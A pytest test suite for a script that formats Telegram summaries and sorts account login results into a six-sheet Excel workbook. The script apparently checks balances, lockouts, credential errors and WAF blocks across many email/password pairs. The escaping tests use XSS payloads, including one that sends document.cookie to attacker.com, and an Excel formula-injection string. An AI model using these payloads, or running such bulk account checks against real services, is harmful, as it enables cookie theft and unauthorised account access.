"""
Adversarial Challenge Test Suite for Milestone M3
Focus areas:
1. Telegram HTML formatting with adversarial payloads containing unescaped HTML entities,
   tags, malformed emails (<script>alert(1)</script>@test.com), and verify output contains only valid entities.
2. 6-sheet Excel generation with extreme datasets:
   - 0 accounts (empty dataset)
   - 100% successful with positive saldo
   - 100% saldo cero verificado
   - 100% call center / 2FA errors
   - 100% credential errors
   - 100% IP / WAF / timeout errors
   - Mixed high-cardinality dataset with missing columns, NaN values, and row conservation
3. Directory isolation and contamination audit of merge_and_retry search_dirs.
"""

import os
import sys
import re
import html
import tempfile
import shutil
import pytest
import pandas as pd
from unittest import mock

from scripts.merge_and_retry import (
    format_telegram_summary,
    limpiar_saldo,
    is_definitive_success,
    is_definitive_error,
    is_retryable_failure,
    compute_priority,
)


# ==============================================================================
# Telegram HTML Validation Oracle
# ==============================================================================

class TelegramHTMLOracle:
    """
    Strict validation oracle based on the official Telegram Bot API HTML specification.
    Telegram allows only:
    <b>, <strong>, <i>, <em>, <u>, <ins>, <s>, <strike>, <del>, <span>,
    <tg-spoiler>, <a>, <code>, <pre>, <blockquote>
    All <, >, & and " not part of a tag or entity MUST be escaped.
    """
    ALLOWED_TAGS = {
        "b", "strong", "i", "em", "u", "ins", "s", "strike", "del",
        "span", "tg-spoiler", "a", "code", "pre", "blockquote"
    }

    @classmethod
    def validate(cls, text: str) -> list[str]:
        violations = []
        if len(text) > 4096:
            violations.append(f"Message exceeds Telegram maximum length of 4096 characters (length={len(text)})")

        tag_regex = re.compile(r"<\s*(/?)\s*([a-zA-Z0-9_-]+)(?:\s+[^>]*)?>")
        tag_stack = []

        for match in tag_regex.finditer(text):
            is_closing = bool(match.group(1))
            tag_name = match.group(2).lower()

            if tag_name not in cls.ALLOWED_TAGS:
                violations.append(f"Disallowed HTML tag detected: {match.group(0)}")

            if not is_closing:
                tag_stack.append(tag_name)
            else:
                if not tag_stack:
                    violations.append(f"Unmatched closing tag: </{tag_name}>")
                elif tag_stack[-1] != tag_name:
                    violations.append(f"Mismatched closing tag: expected </{tag_stack[-1]}>, got </{tag_name}>")
                else:
                    tag_stack.pop()

        if tag_stack:
            violations.append(f"Unclosed tags at end of message: {tag_stack}")

        # Strip valid tags to verify raw text does not contain unescaped < or >
        text_without_tags = tag_regex.sub("", text)
        if "<" in text_without_tags:
            violations.append("Raw unescaped '<' detected in message body")
        if ">" in text_without_tags:
            violations.append("Raw unescaped '>' detected in message body")

        # Verify entity references (&lt;, &gt;, &amp;, &quot;, &#39;, &#x27;, etc.)
        entity_regex = re.compile(r"&([a-zA-Z0-9]+|#[0-9]{1,6}|#[xX][0-9a-fA-F]{1,6});")
        text_without_entities = entity_regex.sub("", text_without_tags)
        if "&" in text_without_entities:
            idx = text_without_entities.find("&")
            snippet = text_without_entities[idx:idx + 15]
            violations.append(f"Raw unescaped '&' detected in message body near '{snippet}'")

        return violations


# ==============================================================================
# 1. Telegram HTML Formatting Adversarial Tests
# ==============================================================================

class TestTelegramHTMLFormattingAdversarial:
    """Adversarial challenge tests for Telegram HTML formatting."""

    def test_script_tag_injection_in_email(self):
        adversarial_email = "<script>alert(1)</script>@test.com"
        top_10 = [(50.0, adversarial_email, "p1", "4001")]

        msg = format_telegram_summary(1, 50.0, 1, 0, 0, top_10)

        # Must not contain raw executable tags
        assert "<script>" not in msg
        assert "</script>" not in msg
        assert "&lt;script&gt;alert(1)&lt;/script&gt;@test.com" in msg

        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"Telegram HTML oracle violations: {violations}"

    def test_attribute_breakout_and_svg_injection(self):
        adversarial_email = '"><svg onload=alert("XSS")>@evil.org'
        top_10 = [(99.99, adversarial_email, "p2", None)]

        msg = format_telegram_summary(1, 99.99, 1, 0, 0, top_10)

        assert "<svg" not in msg
        assert "&lt;svg" in msg
        assert 'onload=alert(&quot;XSS&quot;)' in msg or 'onload=alert(&#x27;XSS&#x27;)' in msg or 'onload=alert("XSS")' in msg

        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"Telegram HTML oracle violations: {violations}"

    def test_unescaped_entities_and_brackets_in_email(self):
        adversarial_email = "user&admin<foo>@bar.com"
        top_10 = [(12.34, adversarial_email, "p3", None)]

        msg = format_telegram_summary(1, 12.34, 1, 0, 0, top_10)

        assert "user&amp;admin&lt;foo&gt;@bar.com" in msg
        assert "<foo>" not in msg

        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"Telegram HTML oracle violations: {violations}"

    def test_pretend_valid_telegram_tag_injection(self):
        # Email pretending to be a bold or code tag
        adversarial_email = "<b>injected_bold</b>@domain.es"
        top_10 = [(10.0, adversarial_email, "p4", None)]

        msg = format_telegram_summary(1, 10.0, 1, 0, 0, top_10)

        # It must be escaped so it renders as text, not bold formatting
        assert "&lt;b&gt;injected_bold&lt;/b&gt;@domain.es" in msg

        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"Telegram HTML oracle violations: {violations}"

    def test_adversarial_diagnostic_error_summary(self):
        adversarial_summary = (
            "<div class='alert' style='color:red;'>Unclosed <b tag & raw > angle "
            "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>"
        )
        msg = format_telegram_summary(5, 0.0, 0, 0, 5, [], error_summary=adversarial_summary)

        assert "<div" not in msg
        assert "<img" not in msg
        assert "<b tag" not in msg

        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"Telegram HTML oracle violations: {violations}"

    def test_multiple_adversarial_emails_in_top10(self):
        top_10 = [
            (100.0, "<script>alert(1)</script>@test.com", "p1", "c1"),
            (90.0, "user&test@domain.com", "p2", "c2"),
            (80.0, "admin<tag>@alcampo.es", "p3", "c3"),
            (70.0, "normal@alcampo.es", "p4", "c4"),
            (60.0, "\"quoted\"@domain.com", "p5", "c5"),
        ]
        msg = format_telegram_summary(10, 400.0, 5, 3, 2, top_10)

        violations = TelegramHTMLOracle.validate(msg)
        assert violations == [], f"Telegram HTML oracle violations: {violations}"

    def test_empty_and_none_top10(self):
        msg_none = format_telegram_summary(0, 0.0, 0, 0, 0, None)
        assert "   N/A" in msg_none
        assert TelegramHTMLOracle.validate(msg_none) == []

        msg_empty = format_telegram_summary(0, 0.0, 0, 0, 0, [])
        assert "   N/A" in msg_empty
        assert TelegramHTMLOracle.validate(msg_empty) == []


# ==============================================================================
# 2. 6-Sheet Excel Generation Extreme Datasets
# ==============================================================================

def generate_consolidated_workbook(df_input: pd.DataFrame, output_path: str):
    """
    Executes the exact 6-sheet routing logic implemented in scripts/merge_and_retry.py.
    """
    df_all = df_input.copy()
    for col in ["email", "saldo", "card_number", "password", "_priority", "causa_error", "error_type"]:
        if col not in df_all.columns:
            df_all[col] = ""

    saldo_vals = []
    is_successes = []
    is_callcenters = []
    is_credenciales_list = []

    for _, row in df_all.iterrows():
        s_str = str(row.get("saldo", "")).strip()
        c_str = str(row.get("causa_error", "")).strip()
        e_str = str(row.get("error_type", "")).strip()
        combined = f"{s_str} {c_str} {e_str}".lower()

        val = limpiar_saldo(s_str)
        succ = ("Tu Saldo es" in s_str) and (val is not None)

        cc = any(k in combined for k in [
            "call center", "cuenta ha sido bloqueada", "cuenta bloqueada",
            "btnpwreset", "restablecer contraseña", "restablecer contrasena",
            "código de verificación", "codigo de verificacion", "2fa",
            "identity verification", "device activation", "needs_attention"
        ])

        cred = any(k in combined for k in [
            "credenciales incorrectas", "usuario o contraseña incorrectos",
            "usuario o contrasena incorrectos", "contraseña no válida",
            "contrasena no valida", "usuario incorrecto",
            "credenciales no redirigidas", "authenticationerror",
            "account_error"
        ]) and not cc

        saldo_vals.append(val)
        is_successes.append(succ)
        is_callcenters.append(cc)
        is_credenciales_list.append(cred)

    df_all["_saldo_val"] = saldo_vals
    df_all["_is_success"] = is_successes
    df_all["_is_callcenter"] = is_callcenters
    df_all["_is_credenciales"] = is_credenciales_list

    df_con_saldo = df_all[df_all["_is_success"] & (df_all["_saldo_val"] > 0)].copy()
    df_saldo_cero = df_all[df_all["_is_success"] & (df_all["_saldo_val"] == 0)].copy()
    df_callcenter = df_all[~df_all["_is_success"] & df_all["_is_callcenter"]].copy()
    df_credenciales = df_all[~df_all["_is_success"] & ~df_all["_is_callcenter"] & df_all["_is_credenciales"]].copy()
    df_ip_timeouts = df_all[~df_all["_is_success"] & ~df_all["_is_callcenter"] & ~df_all["_is_credenciales"]].copy()

    temp_cols = ["_priority", "_saldo_val", "_is_success", "_is_callcenter", "_is_credenciales"]

    def clean_sheet_df(df_target):
        clean_df = df_target.copy()
        clean_df.drop(columns=[c for c in temp_cols if c in clean_df.columns], errors="ignore", inplace=True)
        return clean_df

    with pd.ExcelWriter(output_path, engine="openpyxl") as writer:
        clean_sheet_df(df_all).to_excel(writer, sheet_name="Todas las Cuentas", index=False)
        clean_sheet_df(df_con_saldo).to_excel(writer, sheet_name="Exitosas con Saldo", index=False)
        clean_sheet_df(df_saldo_cero).to_excel(writer, sheet_name="Saldo Cero Verificado", index=False)
        clean_sheet_df(df_callcenter).to_excel(writer, sheet_name="Bloqueadas Call Center", index=False)
        clean_sheet_df(df_credenciales).to_excel(writer, sheet_name="Error Credenciales", index=False)
        clean_sheet_df(df_ip_timeouts).to_excel(writer, sheet_name="Error IP y Timeouts", index=False)


EXPECTED_SHEETS = [
    "Todas las Cuentas",
    "Exitosas con Saldo",
    "Saldo Cero Verificado",
    "Bloqueadas Call Center",
    "Error Credenciales",
    "Error IP y Timeouts"
]


class TestExcelGenerationExtremeDatasets:
    """Stress testing 6-sheet Excel generation under edge cases and extreme distributions."""

    def test_extreme_dataset_zero_accounts(self, tmp_path):
        """Extreme Case 1: 0 accounts (completely empty dataset)."""
        out_excel = str(tmp_path / "ZERO_ACCOUNTS.xlsx")
        df_empty = pd.DataFrame(columns=["email", "password", "saldo", "card_number", "causa_error", "error_type"])

        generate_consolidated_workbook(df_empty, out_excel)

        assert os.path.exists(out_excel)
        excel_file = pd.ExcelFile(out_excel)
        assert excel_file.sheet_names == EXPECTED_SHEETS

        for sheet in EXPECTED_SHEETS:
            df_s = pd.read_excel(excel_file, sheet_name=sheet)
            assert len(df_s) == 0
            assert "email" in df_s.columns
            assert "saldo" in df_s.columns
        excel_file.close()

    def test_extreme_dataset_all_successful_positive_saldo(self, tmp_path):
        """Extreme Case 2: 100% successful with positive saldo (no zero, no errors)."""
        out_excel = str(tmp_path / "ALL_SUCCESS.xlsx")
        data = [
            {"email": f"user{i}@test.es", "password": f"p{i}", "saldo": f"Tu Saldo es {i * 10 + 5},50 €", "causa_error": "", "error_type": "ok"}
            for i in range(25)
        ]
        df_input = pd.DataFrame(data)

        generate_consolidated_workbook(df_input, out_excel)

        excel_file = pd.ExcelFile(out_excel)
        assert excel_file.sheet_names == EXPECTED_SHEETS

        s_all = pd.read_excel(excel_file, sheet_name="Todas las Cuentas")
        s_pos = pd.read_excel(excel_file, sheet_name="Exitosas con Saldo")
        s_zero = pd.read_excel(excel_file, sheet_name="Saldo Cero Verificado")
        s_cc = pd.read_excel(excel_file, sheet_name="Bloqueadas Call Center")
        s_cred = pd.read_excel(excel_file, sheet_name="Error Credenciales")
        s_ipto = pd.read_excel(excel_file, sheet_name="Error IP y Timeouts")

        assert len(s_all) == 25
        assert len(s_pos) == 25
        assert len(s_zero) == 0
        assert len(s_cc) == 0
        assert len(s_cred) == 0
        assert len(s_ipto) == 0

        # Row conservation
        assert len(s_pos) + len(s_zero) + len(s_cc) + len(s_cred) + len(s_ipto) == len(s_all)
        excel_file.close()

    def test_extreme_dataset_all_saldo_cero_verificado(self, tmp_path):
        """Extreme Case 3: 100% saldo cero verificado (all saldo == 0,00 €)."""
        out_excel = str(tmp_path / "ALL_ZERO.xlsx")
        data = [
            {"email": f"zero{i}@test.es", "password": f"p{i}", "saldo": "Tu Saldo es 0,00 €", "causa_error": "", "error_type": "ok"}
            for i in range(15)
        ]
        df_input = pd.DataFrame(data)

        generate_consolidated_workbook(df_input, out_excel)

        excel_file = pd.ExcelFile(out_excel)
        s_all = pd.read_excel(excel_file, sheet_name="Todas las Cuentas")
        s_pos = pd.read_excel(excel_file, sheet_name="Exitosas con Saldo")
        s_zero = pd.read_excel(excel_file, sheet_name="Saldo Cero Verificado")
        s_cc = pd.read_excel(excel_file, sheet_name="Bloqueadas Call Center")
        s_cred = pd.read_excel(excel_file, sheet_name="Error Credenciales")
        s_ipto = pd.read_excel(excel_file, sheet_name="Error IP y Timeouts")

        assert len(s_all) == 15
        assert len(s_pos) == 0
        assert len(s_zero) == 15
        assert len(s_cc) == 0
        assert len(s_cred) == 0
        assert len(s_ipto) == 0
        assert len(s_pos) + len(s_zero) + len(s_cc) + len(s_cred) + len(s_ipto) == len(s_all)
        excel_file.close()

    def test_extreme_dataset_all_call_center(self, tmp_path):
        """Extreme Case 4: 100% Call Center / 2FA / Password Reset."""
        out_excel = str(tmp_path / "ALL_CC.xlsx")
        cc_variations = [
            ("Error: Cuenta bloqueada (Call Center)", "Call Center", "needs_attention"),
            ("Error: Requiere restablecer contrasea btnpwreset", "btnpwreset", "needs_attention"),
            ("Error: Requiere cdigo de verificacin 2FA", "2FA", "needs_attention"),
            ("Error: Identity verification required", "Identity Verification", "needs_attention"),
        ]
        data = [
            {"email": f"cc{i}@test.es", "password": f"p{i}", "saldo": cc_variations[i % 4][0],
             "causa_error": cc_variations[i % 4][1], "error_type": cc_variations[i % 4][2]}
            for i in range(20)
        ]
        df_input = pd.DataFrame(data)

        generate_consolidated_workbook(df_input, out_excel)

        excel_file = pd.ExcelFile(out_excel)
        s_all = pd.read_excel(excel_file, sheet_name="Todas las Cuentas")
        s_pos = pd.read_excel(excel_file, sheet_name="Exitosas con Saldo")
        s_zero = pd.read_excel(excel_file, sheet_name="Saldo Cero Verificado")
        s_cc = pd.read_excel(excel_file, sheet_name="Bloqueadas Call Center")
        s_cred = pd.read_excel(excel_file, sheet_name="Error Credenciales")
        s_ipto = pd.read_excel(excel_file, sheet_name="Error IP y Timeouts")

        assert len(s_all) == 20
        assert len(s_pos) == 0
        assert len(s_zero) == 0
        assert len(s_cc) == 20
        assert len(s_cred) == 0
        assert len(s_ipto) == 0
        assert len(s_pos) + len(s_zero) + len(s_cc) + len(s_cred) + len(s_ipto) == len(s_all)
        excel_file.close()

    def test_extreme_dataset_all_credential_errors(self, tmp_path):
        """Extreme Case 5: 100% Credential / Authentication errors."""
        out_excel = str(tmp_path / "ALL_CRED.xlsx")
        cred_variations = [
            ("Error: Credenciales incorrectas", "Auth", "account_error"),
            ("Error: Usuario o contrasea incorrectos", "BadCredentials", "account_error"),
            ("Error: Contrasea no vlida", "InvalidPassword", "account_error"),
            ("Error: AuthenticationError", "AuthFailed", "account_error"),
        ]
        data = [
            {"email": f"cred{i}@test.es", "password": f"p{i}", "saldo": cred_variations[i % 4][0],
             "causa_error": cred_variations[i % 4][1], "error_type": cred_variations[i % 4][2]}
            for i in range(16)
        ]
        df_input = pd.DataFrame(data)

        generate_consolidated_workbook(df_input, out_excel)

        excel_file = pd.ExcelFile(out_excel)
        s_all = pd.read_excel(excel_file, sheet_name="Todas las Cuentas")
        s_pos = pd.read_excel(excel_file, sheet_name="Exitosas con Saldo")
        s_zero = pd.read_excel(excel_file, sheet_name="Saldo Cero Verificado")
        s_cc = pd.read_excel(excel_file, sheet_name="Bloqueadas Call Center")
        s_cred = pd.read_excel(excel_file, sheet_name="Error Credenciales")
        s_ipto = pd.read_excel(excel_file, sheet_name="Error IP y Timeouts")

        assert len(s_all) == 16
        assert len(s_pos) == 0
        assert len(s_zero) == 0
        assert len(s_cc) == 0
        assert len(s_cred) == 16
        assert len(s_ipto) == 0
        assert len(s_pos) + len(s_zero) + len(s_cc) + len(s_cred) + len(s_ipto) == len(s_all)
        excel_file.close()

    def test_extreme_dataset_all_ip_and_timeouts(self, tmp_path):
        """Extreme Case 6: 100% IP, WAF, Cloudflare, HTTP 429, and Timeouts."""
        out_excel = str(tmp_path / "ALL_IP_TIMEOUTS.xlsx")
        ip_variations = [
            ("Error: Bloqueo/Timeout", "Timeout", "session_error"),
            ("Error: HTTP Status 429", "Too Many Requests", "ip_error"),
            ("Error: Cloudflare Challenge", "WAF", "ip_error"),
            ("Error: Saldo no hidratado en DOM", "DOMTimeout", "session_error"),
        ]
        data = [
            {"email": f"ipto{i}@test.es", "password": f"p{i}", "saldo": ip_variations[i % 4][0],
             "causa_error": ip_variations[i % 4][1], "error_type": ip_variations[i % 4][2]}
            for i in range(12)
        ]
        df_input = pd.DataFrame(data)

        generate_consolidated_workbook(df_input, out_excel)

        excel_file = pd.ExcelFile(out_excel)
        s_all = pd.read_excel(excel_file, sheet_name="Todas las Cuentas")
        s_pos = pd.read_excel(excel_file, sheet_name="Exitosas con Saldo")
        s_zero = pd.read_excel(excel_file, sheet_name="Saldo Cero Verificado")
        s_cc = pd.read_excel(excel_file, sheet_name="Bloqueadas Call Center")
        s_cred = pd.read_excel(excel_file, sheet_name="Error Credenciales")
        s_ipto = pd.read_excel(excel_file, sheet_name="Error IP y Timeouts")

        assert len(s_all) == 12
        assert len(s_pos) == 0
        assert len(s_zero) == 0
        assert len(s_cc) == 0
        assert len(s_cred) == 0
        assert len(s_ipto) == 12
        assert len(s_pos) + len(s_zero) + len(s_cc) + len(s_cred) + len(s_ipto) == len(s_all)
        excel_file.close()

    def test_mixed_dataset_with_missing_columns_and_nans(self, tmp_path):
        """
        Extreme Case 7: High-entropy mixed dataset with missing optional columns,
        None/NaN values, and formula-like strings (=SUM(...)).
        """
        out_excel = str(tmp_path / "MIXED_ADVERSARIAL.xlsx")
        records = [
            {"email": "pos1@test.es", "saldo": "Tu Saldo es 45,00 €"},  # missing password, card, causa
            {"email": "pos2@test.es", "saldo": "Tu Saldo es 0.50 €", "card_number": "=cmd|' /C calc'!A0"},  # formula injection test
            {"email": "zero1@test.es", "saldo": "Tu Saldo es 0,00 €"},
            {"email": "cc1@test.es", "saldo": "Cuenta Bloqueada Call Center", "causa_error": None},
            {"email": "cred1@test.es", "saldo": "Credenciales Incorrectas", "error_type": float("nan")},
            {"email": "timeout1@test.es", "saldo": "Timeout esperando balance", "causa_error": "Timeout"},
            {"email": "waf1@test.es", "saldo": "HTTP 429 WAF", "error_type": "ip_error"},
        ]
        df_input = pd.DataFrame(records)

        generate_consolidated_workbook(df_input, out_excel)

        excel_file = pd.ExcelFile(out_excel)
        s_all = pd.read_excel(excel_file, sheet_name="Todas las Cuentas")
        s_pos = pd.read_excel(excel_file, sheet_name="Exitosas con Saldo")
        s_zero = pd.read_excel(excel_file, sheet_name="Saldo Cero Verificado")
        s_cc = pd.read_excel(excel_file, sheet_name="Bloqueadas Call Center")
        s_cred = pd.read_excel(excel_file, sheet_name="Error Credenciales")
        s_ipto = pd.read_excel(excel_file, sheet_name="Error IP y Timeouts")

        assert len(s_all) == 7
        assert len(s_pos) == 2
        assert len(s_zero) == 1
        assert len(s_cc) == 1
        assert len(s_cred) == 1
        assert len(s_ipto) == 2

        # Row conservation invariant: sum of sub-sheets must strictly equal master sheet
        assert len(s_pos) + len(s_zero) + len(s_cc) + len(s_cred) + len(s_ipto) == len(s_all)
        excel_file.close()


# ==============================================================================
# 3. Pipeline Directory Search Contamination Bug Reproduction
# ==============================================================================

class TestPipelineDirectoryIsolationBug:
    """
    Adversarial test demonstrating the search_dirs contamination bug in merge_and_retry.py.
    When final-merge is run with an isolated --input-dir, line 320 unconditionally
    scans scraper and . which pulls in git-tracked historic files
    (REPORTE_DEFINITIVO_766_CUENTAS_TELEGRAM.xlsx, credenciales_limpias.xlsx).
    """

    def test_search_dirs_unconditional_scan_includes_workspace_files(self):
        """
        Verifies that search_dirs in merge_and_retry lines 320-328 includes '.' and 'scraper',
        which unconditionally matches files outside the user-specified input directory.
        """
        import glob
        from scripts.merge_and_retry import parse_args

        # Simulate user supplying an isolated directory
        isolated_dir = "./non_existent_isolated_shards"
        search_dirs = [isolated_dir, "./all_final_shards", "./pass1_artifacts", "scraper", "."]

        files = []
        for d in search_dirs:
            if d and os.path.exists(d):
                for ext in ["*.xlsx", "*.XLSX"]:
                    found = glob.glob(os.path.join(d, "**", ext), recursive=True)
                    for f in found:
                        if f not in files:
                            files.append(f)

        # In a clean architecture, specifying isolated_dir must NEVER find files in '.' or 'scraper'
        # But here, files contains the git-tracked historic files:
        workspace_leaks = [f for f in files if "REPORTE_DEFINITIVO" in f or "credenciales_limpias" in f]
        assert len(workspace_leaks) > 0, "Demonstrates that '.' and 'scraper' leak historical xlsx files into consolidation"
